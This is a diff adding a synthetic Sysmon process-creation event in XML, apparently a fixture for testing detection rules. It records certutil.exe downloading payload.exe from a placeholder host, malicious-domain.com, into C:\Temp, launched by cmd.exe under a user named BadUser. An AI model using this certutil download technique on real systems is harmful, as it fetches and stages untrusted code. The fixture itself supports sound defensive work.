@@ -1,0 +1,42 @@
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2025-01-15T14:45:30.987654Z" />
+    <EventRecordID>54321</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="2345" ThreadID="6789" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-USER01</Computer>
+    <Security UserID="S-1-5-21-123456789-123456789-123456789-1001" />
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2025-01-15 14:45:30.987</Data>
+    <Data Name="ProcessGuid">{87654321-4321-4321-4321-210987654321}</Data>
+    <Data Name="ProcessId">0x4d2</Data>
+    <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
+    <Data Name="FileVersion">10.0.19041.1</Data>
+    <Data Name="Description">Certificate Services Command Line Tool</Data>
+    <Data Name="Product">Microsoft Windows Operating System</Data>
+    <Data Name="Company">Microsoft Corporation</Data>
+    <Data Name="OriginalFileName">CertUtil.exe</Data>
+    <Data Name="CommandLine">certutil.exe -urlcache -split -f http://malicious-domain.com/payload.exe C:\Temp\payload.exe</Data>
+    <Data Name="CurrentDirectory">C:\Users\BadUser\Downloads\</Data>
+    <Data Name="User">DESKTOP-USER01\BadUser</Data>
+    <Data Name="LogonGuid">{87654321-4321-4321-4321-210987654322}</Data>
+    <Data Name="LogonId">0x12345</Data>
+    <Data Name="TerminalSessionId">1</Data>
+    <Data Name="IntegrityLevel">Medium</Data>
+    <Data Name="Hashes">SHA256=DEF789ABC123</Data>
+    <Data Name="ParentProcessGuid">{87654321-4321-4321-4321-210987654320}</Data>
+    <Data Name="ParentProcessId">0x3e8</Data>
+    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+    <Data Name="ParentCommandLine">cmd.exe</Data>
+  </EventData>
+</Event>
